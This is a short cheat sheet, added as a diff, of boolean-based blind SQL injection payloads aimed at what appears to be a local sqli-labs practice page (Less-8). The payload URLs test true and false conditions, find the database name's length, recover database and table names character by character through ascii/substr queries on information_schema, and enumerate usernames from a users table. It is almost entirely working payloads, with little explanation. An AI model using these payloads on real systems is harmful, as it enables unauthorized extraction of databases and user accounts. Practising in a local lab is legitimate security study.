@@ -1,0 +1,49 @@
+Blind SQL
+----------
+Boolean Based sql injection
+---------------------------
+SELECT * from table_name WHERE id=1'  (No error) -- blind sql 
+
+
+http://localhost:81/sqli/Less-8/?id=1' AND 1=1 --+
+SELECT * from table_name WHERE id=1' AND 1=1
+(TRUE)
+
+
+http://localhost:81/sqli/Less-8/?id=1' AND 1=0 --+
+SELECT * from table_name WHERE id=1' AND 1=0
+(FALSE)
+
+
+length of database string
+-------------------------
+http://localhost:81/sqli/Less-8/?id=1' AND (length(database())) = 1 --+ 
+keep change the value of 1 until it returns true
+
+Database name
+-------------
+http://localhost:81/sqli/Less-8/?id=1' AND (ascii(substr((select database()),1[1st letter of dbname],1))) > 100 --+
+
+
+Table string length
+-------------------
+http://localhost:81/sqli/Less-8/?id=1' AND (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) > 5 --+
+
+
+first string of table name
+--------------------------
+http://localhost:81/sqli/Less-8/?id=1' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,1,1))) > 120 --+
+
+
+user Name Enumeration
+---------------------
+http://localhost:81/sqli/Less-8/?id=1' AND (length((select username from users limit 0,1))) = 4 --+
+
+
+http://localhost:81/sqli/Less-8/?id=1' AND (ascii(substr((select username from users limit 0,1) ,1,1))) = 68 --+
+
+
+
+
+
+
